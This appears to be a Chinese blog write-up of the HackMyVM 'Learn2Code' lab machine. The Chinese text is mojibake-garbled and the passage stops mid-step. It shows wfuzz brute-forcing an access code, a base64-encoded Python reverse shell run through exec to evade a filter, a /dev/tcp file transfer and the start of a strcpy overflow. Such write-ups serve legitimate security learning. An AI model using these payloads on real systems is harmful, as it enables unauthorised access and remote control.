    <content><![CDATA[<p>HMV-Learn2Codeé¶æœºå¤ç›˜ </p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.58.164 -p-</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">27</span> <span class="number">14</span>:<span class="number">37</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.164</span>)</span><br><span class="line">Host is up (<span class="number">0.0019</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65534</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|<span class="params">_http-title:</span> Access system</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">0</span>E:EA:<span class="number">64</span>:<span class="number">0</span>E:<span class="number">8</span>F:AB (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.89</span> ms bogon (<span class="number">192.168</span>.<span class="number">58.164</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">9.44</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>åªå¼€æ”¾äº†80ç«¯å£ï¼Œé‚£å°±ç›´æ¥è¿›å…¥webç¯èŠ‚äº†</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p><img src="https://pic1.imgdb.cn/item/67c00984d0e0a243d406da07.png"><br>å¾—åˆ°äº†ä¸€ä¸ªå¥‡æ€ªçš„è¾“å…¥æ¡†<br>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå¯ä»¥æ‰¾åˆ°æœ‰ä¸€ä¸ª<code>includes/js/functions.js</code>ç•Œé¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_code</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> params = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;action=check_code&quot;</span>, <span class="string">&quot;code=&quot;</span>+$(<span class="string">&#x27;#code&#x27;</span>).val());</span><br><span class="line">	php_ajax(params, <span class="string">&quot;includes/php/access.php&quot;</span>, <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (response.<span class="built_in">indexOf</span>(<span class="string">&quot;wrong&quot;</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">			$(<span class="string">&#x27;.result&#x27;</span>).show();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$(<span class="string">&#x27;body&#x27;</span>).html(response);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run_code</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> params = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;action=run_code&quot;</span>, <span class="string">&quot;code=&quot;</span>+$(<span class="string">&#x27;#custom_code&#x27;</span>).val());</span><br><span class="line">	php_ajax(params, <span class="string">&quot;includes/php/runcode.php&quot;</span>, <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">		$(<span class="string">&#x27;#response_code&#x27;</span>).val(response);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>includes/js/custom_lib.js</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">php_ajax</span>(<span class="params"><span class="keyword">params</span>, php_file, response</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">params</span>.length; i+=<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">var</span> parametros = <span class="keyword">params</span>[i];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			parametros = parametros + <span class="string">&quot;&amp;&quot;</span> + <span class="keyword">params</span>[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	xmlhttp.onreadystatechange = function() &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">			response(<span class="keyword">this</span>.responseText);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	xmlhttp.open(<span class="string">&quot;POST&quot;</span>, php_file, <span class="literal">true</span>);</span><br><span class="line">	xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">	xmlhttp.send(parametros);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªé¡µé¢è¿˜è®¾ç½®äº†ä¸€ä¸ªè¯·æ±‚å¤´<code>&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;</code><br>æœ€åæˆ‘ä»¬è¿˜èƒ½ä»é¡µé¢æºä»£ç è¿™é‡ŒçŸ¥é“</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;number&quot;</span> <span class="attribute">class</span>=<span class="string">&quot;form-control text-center&quot;</span> <span class="attribute">min-length</span>=<span class="string">&quot;6&quot;</span> <span class="attribute">max-length</span>=<span class="string">&quot;6&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;code&quot;</span> <span class="attribute">name</span>=<span class="string">&quot;code&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
<p>codeæ˜¯ä¸€ä¸ªå…­ä½æ•°</p>
<p>ç¬¬ä¸€ä¸ªcheck_code()å‡½æ•°å°±æ˜¯æˆ‘ä»¬åœ¨é¦–é¡µæ ¡éªŒcodeçš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªrun_codeæ˜¯ä»€ä¹ˆå‘¢ï¼Œå®ƒè¿è¡Œåä¼šå»<code>includes/php/runcode.php</code>ç•Œé¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="regexp">/tmp]</span></span><br><span class="line"><span class="regexp">â””â”€# curl http:/</span><span class="regexp">/192.168.58.164/includes</span><span class="regexp">/php/runcode</span>.php  </span><br><span class="line">Don<span class="string">&#x27;t be a cheater!</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¿¡æ¯ï¼Œè‚¯å®šä¼šåˆ©ç”¨åˆ°ï¼<br>é‚£ç°åœ¨æœ€ç›´æ¥çš„åšæ³•å°±æ˜¯çˆ†ç ´codeäº†ï¼Œç”Ÿæˆæ‰€æœ‰çš„6ä½æ•°ä½œä¸ºå­—å…¸ï¼Œç„¶åè¿˜è¦æŒ‡å®šä¸€ä¸ªContent-typeå¤´<br>ç”¨wfuzzè·‘<br>è¿™é‡Œå¥½åƒå› ä¸ºä¼šå› ä¸ºæˆ‘çš„cpué™åˆ¶è‡ªåŠ¨ç»ˆæ­¢äº†ï¼Œæ‰€ä»¥æˆ‘åˆ†æ‰¹æ“ä½œäº†ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wfuzz -c -z file,tmp.txt -u &quot;http://192.168.58.164/includes/php/access.php&quot; \</span><br><span class="line"><span class="code">    -X POST -d &quot;action=check_code&amp;code=FUZZ&quot; \</span></span><br><span class="line"><span class="code">    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="code">    --hw 1 -t 100  </span></span><br><span class="line"><span class="code"></span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.164/includes/php/access.php</span><br><span class="line">Total requests: 1000000</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                             </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000012774:   200        0 L      1 W        5 Ch        &quot;012773&quot;                                            </span><br><span class="line">zsh: killed     wfuzz -c -z file,tmp.txt -u &quot;http://192.168.58.164/includes/php/access.php&quot; -</span><br><span class="line"></span><br><span class="line"><span class="code">                                                                                                                     </span></span><br><span class="line"><span class="code">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="code">â””â”€# wfuzz -c -z file,tmp -u &quot;http://192.168.58.164/includes/php/access.php&quot; \ </span></span><br><span class="line"><span class="code">    -X POST -d &quot;action=check_code&amp;code=FUZZ&quot; \</span></span><br><span class="line"><span class="code">    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="code">    --hw 1  --hc 5 -t 100</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.164/includes/php/access.php</span><br><span class="line">Total requests: 87635</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                             </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000081488:   200        47 L     98 W       1543 Ch     &quot;993852&quot;                                            </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 87635</span><br><span class="line">Filtered Requests: 87634</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure></div>

<p> æ‰¾åˆ°äº†code<code>993852</code> ä½†æ˜¯æˆ‘åœ¨è¾“å…¥çš„æ—¶å€™è¿˜æ˜¯é”™è¯¯ï¼Œä½†æ˜¯wfuzzåˆšåˆšæ˜¯æµ‹çš„æ²¡é—®é¢˜ï¼Œå°±è¯´æ˜è¿™ä¸ªcodeæ˜¯åœ¨å˜åŒ–çš„ï¼Œæ‰€ä»¥å¿…é¡»å¿«é€Ÿå¾—åˆ°å°±ç™»å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wfuzz -c -z file,tmp -u &quot;http://192.168.58.164/includes/php/access.php&quot; \</span><br><span class="line"><span class="code">    -X POST -d &quot;action=check_code&amp;code=FUZZ&quot; \</span></span><br><span class="line"><span class="code">    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="code">    --hw 1  --hc 5 -t 100</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.164/includes/php/access.php</span><br><span class="line">Total requests: 87000</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                             </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000032297:   200        47 L     98 W       1543 Ch     &quot;945296&quot;   </span><br></pre></td></tr></table></figure></div>
<p>ç™»å½•ä¹‹åæœ‰ä¸€ä¸ªè¾“å…¥æ¡†è®©æˆ‘ä»¬è¾“å…¥ä»£ç <br><img src="https://pic1.imgdb.cn/item/67c0194cd0e0a243d406feb7.png"><br>ä½†æ˜¯ä¸çŸ¥é“è¦è¾“å…¥ä»€ä¹ˆä»£ç ï¼Œæˆ‘å…ˆæµ‹è¯•ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, <span class="built_in">line</span> <span class="number">1</span>, in <span class="symbol">&lt;module&gt;</span></span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, <span class="built_in">line</span> <span class="number">1</span></span><br><span class="line">    nc -<span class="keyword">e</span> bin/bash</span><br><span class="line">            ^</span><br><span class="line">SyntaxError: invalid <span class="keyword">syntax</span></span><br></pre></td></tr></table></figure></div>
<p>å‡ºç°è¿™ç§æŠ¥é”™ï¼Œè¯´æ˜æ˜¯pythonä»£ç ï¼Œé‚£å°±ç”¨pythonçš„åå¼¹shell<br>æˆ‘å…ˆæ˜¯è¾“å…¥äº†ä¸€ä¸ªæ­£å¸¸çš„pythonåå¼¹shellä»£ç ï¼Œæç¤ºPlease, donâ€™t use malicious code<br>è¯´æ˜è¿‡æ»¤äº†æŸäº›å€¼<br>æŠŠæˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ç”¨base64ç¼–ç ï¼Œç„¶åç”¨execå‡½æ•°æ‰§è¡Œ<br><img src="https://pic1.imgdb.cn/item/67c01ad8d0e0a243d4070178.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">exec <span class="string">&quot;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTguMTEiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk7&quot;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234</span></span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">505</span>): <span class="title class_">Inappropriate</span> ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data<span class="variable">@Learn2Code</span><span class="symbol">:/var/www/html/includes/php</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°www-dataçš„shell</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æ²¡æœ‰sudoæƒé™ï¼Œç„¶åç”¨findæŒ‡ä»¤æ‰¾äº†ä¸€ä¸‹è¾“å…¥learnerç”¨æˆ·çš„æ–‡ä»¶ï¼Œä¹Ÿæ²¡æœ‰å‘ç°ï¼Œ<br>ä¸Šä¼ linpeas.shæ‰¾ä¸€ä¸‹æ•æ„Ÿçš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">[+] SGID</span><br><span class="line">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class="comment">#sudo-and-suid</span></span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root mail      19K Dec <span class="number"> 3 </span><span class="number"> 2017 </span>/usr/bin/dotlockfile</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root tty       15K May <span class="number"> 4 </span><span class="number"> 2018 </span>/usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow    31K Jul<span class="number"> 27 </span><span class="number"> 2018 </span>/usr/bin/expiry</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow    71K Jul<span class="number"> 27 </span><span class="number"> 2018 </span>/usr/bin/chage</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root tty       35K Jan<span class="number"> 10 </span><span class="number"> 2019 </span>/usr/bin/wall</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow    39K Feb<span class="number"> 14 </span><span class="number"> 2019 </span>/usr/sbin/unix_chkpwd</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root crontab   43K Oct<span class="number"> 11 </span><span class="number"> 2019 </span>/usr/bin/crontab</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root ssh      315K Jan<span class="number"> 31 </span><span class="number"> 2020 </span>/usr/bin/ssh-agent</span><br><span class="line">-r-sr-sr-x<span class="number"> 1 </span>root www-data  17K Sep<span class="number"> 28 </span><span class="number"> 2020 </span>/usr/bin/MakeMeLearner</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æœ‰ä¸€ä¸ª<code>/usr/bin/MakeMeLearner</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line">www<span class="operator">-</span>data<span class="meta">@Learn2Code</span>:<span class="regexp">/tmp$ file /</span>usr<span class="regexp">/bin/</span><span class="type">MakeMeLearner</span></span><br><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/MakeMeLearner: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /</span>lib64<span class="regexp">/ld-linux-x86-64.so.2, BuildID[sha1]=bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, for GNU/</span><span class="type">Linux</span> <span class="number">3.2</span>.<span class="number">0</span>, not stripped</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 4444 &gt; MakeMeLearner</span></span><br><span class="line"></span><br><span class="line">www-data@Learn2Code:<span class="regexp">/tmp$ cat /u</span>sr<span class="regexp">/bin/</span>MakeMeLearner &gt; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.58.11/</span><span class="number">4444</span></span><br></pre></td></tr></table></figure></div>
<p>åœ¨æœ¬æœºç”¨stringsçœ‹äº†ä¸€ä¸‹ï¼Œå¥½åƒæœ‰binbashï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½çœ‹å‡ºæ¥åœ¨å¹²å˜›ï¼Œç”¨idaæ‰“å¼€åˆ†æä¸€ä¸‹<br>mainå‡½æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">76</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">errx</span>(<span class="number">1</span>, <span class="string">&quot;please specify an argument\n&quot;</span>, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Change the &#x27;modified&#x27; variable value to &#x27;0x61626364&#x27; to be a learner&quot;</span>);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1633837924</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0x3E8u</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0x3E8u</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again, you got 0x%08x\n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨strcpyçš„æ ˆæº¢å‡ºï¼Œè¿™é‡Œçš„pwnå°±æ˜¯æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†ï¼Œåªèƒ½çœ‹wpäº†ï¼Œåé¢webå­¦å¥½äº†ä¼šç»§ç»­å­¦pwnçš„çŸ¥è¯†<br>æ‰§è¡Œä¸€ä¸‹è¿™ä¸ªç¨‹åº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">www-data@Learn2Code:/tmp$ /usr/bin/MakeMeLearner <span class="number">1633837924</span></span><br><span class="line">Change <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x00000000</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># rax2 -s 0x61626364</span></span><br><span class="line">abcd  </span><br></pre></td></tr></table></figure></div>
<p>å®ƒè¿™é‡Œè¿”å›çš„æ¶ˆæ¯æ˜¯æƒ³è¦abcd<br>è¿™é‡Œç¬¬ä¸€ç§æ–¹æ¡ˆæ˜¯éšä¾¿å†™ç‚¹ä¸œè¥¿ï¼Œå‘ç°åœ¨å¾ˆé•¿çš„æ—¶å€™å°±ä¸æ˜¯you got 0x00000000äº†ï¼Œç„¶åå†æ‰¾åˆ°ä¸€ä¸ªè¾¹ç•Œå€¼ï¼Œæœ€åå“¦è¾“å…¥abcdå°±èƒ½ç¬¦åˆæ¡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">hange <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x00666164</span></span><br><span class="line">&lt;flkasjdlkhjsdhhuihsjfnkjadsnfkjdhjskkccsksdfksdjkfhasdkfajdfasdfssdfasds   </span><br><span class="line">Change <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x00000000</span></span><br><span 